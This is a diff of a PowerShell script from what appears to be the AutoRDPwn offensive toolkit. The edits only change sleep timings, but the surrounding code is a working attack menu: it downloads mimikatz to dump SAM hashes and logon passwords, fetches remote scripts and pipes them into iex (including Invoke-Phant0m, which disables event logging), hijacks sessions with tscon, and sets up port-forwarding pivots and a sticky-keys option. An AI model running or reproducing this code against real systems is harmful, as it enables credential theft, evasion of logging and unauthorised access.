@@ -275,7 +275,7 @@ if($Language -in 'Spanish') {
         Write-Host ""; Write-Host "$using:txt25" ; $Host.UI.RawUI.ForegroundColor = 'Gray'  
         query session ; Write-Host "" ; $tscon = Read-Host -Prompt "$txt26"
 	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
-        else{ Write-Host "$txt3c" -ForegroundColor Red ; sleep -milliseconds 3000 ; $input = $null ; Show-Banner ; Show-Menu }}
+        else{ Write-Host "$txt3c" -ForegroundColor Red ; sleep -milliseconds 2000 ; $input = $null ; Show-Banner ; Show-Menu }}
 
         'M' {
         Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - $txt9a" ; Write-Host "[3] - $txt9b" ; Write-Host "[4] - Remote Desktop Forensics"
@@ -286,7 +286,7 @@ if($Language -in 'Spanish') {
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $mimikatz = $Host.UI.ReadLine() ; Write-Host ""
 
-        if($mimikatz -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
+        if($mimikatz -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Yellow
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/mimikatz.zip" -UseBasicParsing -Outfile mimikatz.zip
@@ -294,9 +294,9 @@ if($Language -in 'Spanish') {
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
-        Write-Host "" ; pause ; del .\mimikatz.zip ; Remove-Item -path mimikatz -Recurse -Force }
+        Write-Host "" ; pause ; del .\mimikatz.zip ; Remove-Item -path mimikatz -Recurse -Force ; sleep -milliseconds 2000 }
 
-        if($mimikatz -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
+        if($mimikatz -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "" ; Write-Host "$txt8a $system $txt8b" -ForegroundColor Yellow
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Executables/mimikatz.zip" -UseBasicParsing -Outfile mimikatz.zip
@@ -304,43 +304,43 @@ if($Language -in 'Spanish') {
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         powershell $mimipath\mimikatz.exe 'privilege::debug token::elevate sekurlsa::logonPasswords` full exit'
-        Write-Host "" ; pause ; del .\mimikatz.zip ; Remove-Item -path mimikatz -Recurse -Force }
+        Write-Host "" ; pause ; del .\mimikatz.zip ; Remove-Item -path mimikatz -Recurse -Force ; sleep -milliseconds 2000 }
 
-        if($mimikatz -in '1','2','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta }}
-        if($module -like '2') { $console ="true" ; Write-Host "$txt10" -ForegroundColor Green }
+        if($mimikatz -in '1','2','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        if($module -like '2') { $console ="true" ; Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 }
 
-        if($module -like '3') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
+        if($module -like '3') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
-        Invoke-Phant0m ; pause }
+        Invoke-Phant0m ; pause ; sleep -milliseconds 2000 }
 
         if($module -like '4') { Show-Banner ; Write-Host "[1] - $txt7c" ; Write-Host "[2] - $txt7d" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $forensics = $Host.UI.ReadLine() ; Write-Host ""
         if($forensics -like '1') { Write-Host "$txt10" -ForegroundColor Green ; Write-Host "" ; Write-Host "$txt9c" -ForegroundColor Magenta
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex 
-        explorer $env:temp\Recovered_RDP_Session ; Write-Host "" ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force }
-        if($forensics -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; Write-Host ""
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex ; pause }
+        explorer $env:temp\Recovered_RDP_Session ; Write-Host "" ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; sleep -milliseconds 2000 }
+        if($forensics -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 ; Write-Host ""
+        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex ; pause ; sleep -milliseconds 2000 }
         
         if($forensics -in '1','2','m') { $null }
-        else { Write-Host "$txt4" -ForegroundColor Magenta }}
-        if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt10" -ForegroundColor Green }
+        else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 }
 	
         if($module -like '6') { Show-Banner ; Write-Host "[1] - $txt8c" ; Write-Host "[2] - $txt8d" ; Write-Host "[3] - $txt9d" ; Write-Host "[M] - $txt11" ; Write-Host ""
         $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $forwarding = $Host.UI.ReadLine() ; Write-Host "" ; if($forwarding -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; Write-Host ""
+        $forwarding = $Host.UI.ReadLine() ; Write-Host "" ; if($forwarding -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 ; Write-Host ""
         $lport = Read-Host -Prompt "$txt31" ; Write-Host "" ; $lhost = Read-Host -Prompt "$txt32" ; Write-Host "" ; $rport = Read-Host -Prompt "$txt33" ; Write-Host "" ; $rhost = Read-Host -Prompt "$txt34"
-        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt35" -ForegroundColor Yellow ; sleep -milliseconds 1000 }
+        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt35" -ForegroundColor Yellow ; sleep -milliseconds 2000 }
         
-        if($forwarding -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; $proxy = netsh interface portproxy show all ; Write-Host ""
-        if(!$proxy){ Write-Host "$txt36" -ForegroundColor Magenta ; sleep -milliseconds 1000 } else { netsh interface portproxy show all ; pause }}
+        if($forwarding -like '2') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 ; $proxy = netsh interface portproxy show all ; Write-Host ""
+        if(!$proxy){ Write-Host "$txt36" -ForegroundColor Magenta ; sleep -milliseconds 2000 } else { netsh interface portproxy show all ; pause ; sleep -milliseconds 2000 }}
 
-        if($forwarding -like '3') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; $proxy = netsh interface portproxy show all
-        if(!$proxy){ Write-Host "" ; Write-Host "$txt36" -ForegroundColor Magenta ; sleep -milliseconds 1000 } else { netsh interface portproxy reset ; Write-Host "$txt37" -ForegroundColor Magenta ; sleep -milliseconds 1000 }}
-        if($forwarding -in '1','2','3','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta }}
+        if($forwarding -like '3') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 2000 ; $proxy = netsh interface portproxy show all
+        if(!$proxy){ Write-Host "" ; Write-Host "$txt36" -ForegroundColor Magenta ; sleep -milliseconds 2000 } else { netsh interface portproxy reset ; Write-Host "$txt37" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
+        if($forwarding -in '1','2','3','m') { $null } else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
 
 	if($module -in '1','2','3','4','5','6','m') { $null }
-        else { Write-Host "$txt4" -ForegroundColor Magenta } sleep -milliseconds 2000 }
+        else { Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
         'X' { continue }
 
         default { Write-Host "" ; Write-Host "$txt4" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}} until ($input -in '1','2','3','4','5','6','X')
